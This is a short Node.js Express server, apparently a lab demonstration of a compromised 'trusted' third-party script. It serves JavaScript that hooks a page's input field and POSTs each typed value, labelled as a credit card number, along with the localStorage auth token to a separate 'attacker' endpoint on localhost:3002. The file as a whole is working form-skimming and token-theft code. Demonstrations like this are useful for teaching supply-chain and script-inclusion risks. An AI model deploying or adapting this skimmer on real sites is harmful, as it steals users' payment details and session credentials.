const express = require('express');
const app = express();
const port = 3001;

app.get('/trusted-external-script.js', (req, res) => {
    const script = `
        document.addEventListener('DOMContentLoaded', () => {
            document.body.style.backgroundColor = 'crimson';
            const input = document.querySelector('input');
            if (input) {
                input.addEventListener('input', () => {
                    const value = input.value;
                    console.log('Trusted external script (exploited) | input value changed:', value);
                    fetch('http://localhost:3002/attacker', {
                        method: 'POST',
                        body: JSON.stringify({ creditCard: value, authToken: localStorage.getItem('authToken') }),
                        headers: {
                            'Content-Type': 'application/json'
                        }
                    })
                    .then(res => console.log('Trusted external script executes the POST request towards attacker | Fetch response:', res.status))
                    .catch(err => console.error('Trusted external script | Error sending data:', err));
                });
            }
        });
    `;
    res.set('Content-Type', 'application/javascript');
    res.send(script);
});

app.listen(port, () => {
    console.log(`Analytics server running at http://localhost:${port}`);
});
